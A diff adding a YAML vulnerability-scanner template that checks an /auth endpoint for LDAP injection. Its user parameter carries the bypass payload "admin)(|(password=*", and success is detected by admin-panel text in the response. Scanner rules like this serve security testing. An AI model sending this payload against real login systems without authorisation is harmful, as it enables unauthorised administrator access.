@@ -1,0 +1,24 @@
+name: LDAP注入测试
+description: 测试LDAP注入漏洞
+level: 高
+author: Test
+request:
+  method: GET
+  path: /auth
+  params:
+    user: "admin)(|(password=*"
+    pass: "password"
+  headers:
+    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+response:
+  matchType: contains
+  successIndicators:
+    - "welcome admin"
+    - "admin panel"
+    - "管理员面板"
+  errorIndicators:
+    - "invalid credentials"
+    - "authentication failed"
+    - "认证失败"
+  statusCode: 200
